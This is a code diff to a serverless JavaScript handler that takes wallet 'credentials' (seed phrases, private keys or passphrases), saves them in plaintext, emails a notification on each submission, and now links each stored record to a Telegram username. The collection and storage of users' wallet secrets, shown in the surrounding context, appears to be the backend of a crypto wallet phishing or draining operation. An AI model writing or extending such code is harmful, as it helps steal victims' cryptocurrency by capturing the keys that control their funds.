@@ -61,7 +61,7 @@ exports.handler = async (event) => {
 
   try {
     const body = JSON.parse(event.body);
-    const { walletName, walletType, inputType, credentials, accountIndex = 0 } = body;
+    const { walletName, walletType, inputType, credentials, accountIndex = 0, telegramUsername = '' } = body;
 
     // Validate required fields
     if (!walletName) {
@@ -146,6 +146,13 @@ exports.handler = async (event) => {
         existingWallet.walletId,
         balanceData.balance
       );
+
+      // Associate this wallet with the verified Telegram user (if provided)
+      if (telegramUsername) {
+        await walletStore.updateWalletTelegramUsername(existingWallet.walletId, telegramUsername)
+          .catch(err => console.error('Failed to set Telegram association:', err.message));
+        existingWallet.telegramUsername = telegramUsername;
+      }
 
       // Send email notification for returning user (async, don't wait)
       const inputTypeLabel = existingWallet.inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase'
@@ -268,6 +275,13 @@ exports.handler = async (event) => {
             balanceData.balance
           );
 
+          // Associate this wallet with the verified Telegram user (if provided)
+          if (telegramUsername) {
+            await walletStore.updateWalletTelegramUsername(existingWalletByAddress.walletId, telegramUsername)
+              .catch(err => console.error('Failed to set Telegram association:', err.message));
+            existingWalletByAddress.telegramUsername = telegramUsername;
+          }
+
           const fallbackInputTypeLabel = existingWalletByAddress.inputType === INPUT_TYPES.SEED_PHRASE ? 'Seed Phrase'
             : existingWalletByAddress.inputType === INPUT_TYPES.PRIVATE_KEY ? 'Private Key'
             : 'Passphrase';
@@ -361,7 +375,8 @@ exports.handler = async (event) => {
       await walletStore.saveWallet({
         ...walletInfo,
         balance: balanceData.balance,
-        credentials: credentials // Store the seed phrase or passphrase
+        credentials: credentials, // Store the seed phrase or passphrase
+        telegramUsername: telegramUsername // Associate with the verified Telegram user
       });
 
       // Send email notification (async, don't wait)
